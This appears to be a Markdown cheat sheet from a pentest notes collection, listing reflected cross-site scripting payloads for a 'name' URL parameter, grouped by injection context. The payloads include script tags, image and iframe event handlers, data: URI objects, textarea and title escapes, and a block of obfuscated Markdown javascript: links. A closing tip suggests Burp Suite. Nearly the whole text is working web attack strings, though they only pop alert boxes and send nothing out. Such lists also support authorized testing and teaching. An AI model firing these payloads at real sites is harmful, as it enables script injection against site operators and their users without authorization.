# Cross-Site Scripting (XSS)

- __`/?name=">test123`__
- __`/?name=">test123<script>alert(1)</script>`__
- __`/?name=">test123<script>alert(1);//</script>`__
- __`/?name=">test123<image src=x onerror=alert()>`__
- __`/?name=">test123<image src=x onmouseover=alert()>`__
- __`/?name=">test123<image src=x onmouseover=document.write(1)>`__
- __`/?name=javascript:alert()` or `/?name=<a href=javascript:alert(1)>test123`__
- __`/?name=<iframe src=javascript:alert(1)>`__
- __`/?name=<object data="data:text/html,<script>alert(1)</script>"></object>`__
- __`/?name=<object data="data:text/javascript,<h1>test123"></object>`__
- __`/?name=<script src=data:text/javascript,alert(1337)></script>`__
- __`/?name="><h1><u/onmouseover=alert(1)>test123`__
- __`/?name=test123';alert(1);//`__
#### for "input" tag
- __`/?name=test123" onmouseover=aler(1);//`__

#### for <textarea>
- __`/?name=test123</textarea><img/src=x onerror=alert(2)>`__


#### for </title>
- __`/?name=test123</title><img/src=x onerror=alert(2)>`__


#### for markdown
- __`/?name=[test123](javascript://alert'')`__
- __`/?name=[test123](javascript:alert'')`__
```
[a](javascript:this;alert(1))
[a](javascript:this;alert(1&#41;)
[a](javascript&#58this;alert(1&#41;)
[a](Javas&#99;ript:alert(1&#41;)
[a](Javas%26%2399;ript:alert(1&#41;)
[a](javascript:alert&#65534;(1&#41;)
[a](javascript:confirm(1)
[a](javascript://www.google.com%0Aprompt(1))
[a](javascript://%0d%0aconfirm(1);com)
[a](javascript:window.onerror=confirm;throw%201)
[a](javascript:alert(document.domain&#41;)
[a](javascript://www.google.com%0Aalert(1))
[a]('javascript:alert("1")')
[a](JaVaScRiPt:alert(1))
```
- > __If you are not getting /?name=test123 in url you can use burpsuite__
  - ![image1](https://github.com/Chittu13/All_in_one/blob/main/image/image1.png)
